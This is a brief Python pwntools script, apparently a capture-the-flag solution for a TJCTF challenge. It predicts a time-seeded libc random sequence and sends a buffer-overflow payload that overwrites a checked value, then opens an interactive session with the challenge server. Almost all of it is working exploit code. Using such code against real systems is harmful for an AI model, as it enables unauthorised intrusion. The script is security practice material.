#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
import ctypes
import sys
context.log_level = 'debug'

if sys.argv[1] == 'l':
	io = process('./test')
else:
	io = remote('problem1.tjctf.org', 8000)

dll = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6') 

v4 = dll.time(0)
#print v4
dll.srand(v4)
v3 = [ dll.rand()  for i in range(10) ]
payload = '\x11'*(0x40)
for i in v3:
	payload += p32(i)
payload += '\x11'*(0x18)	
payload += p32(0xdeadbeef+0x11111111-10)
#info(payload)

io.sendlineafter("?\n",payload)

io.interactive()
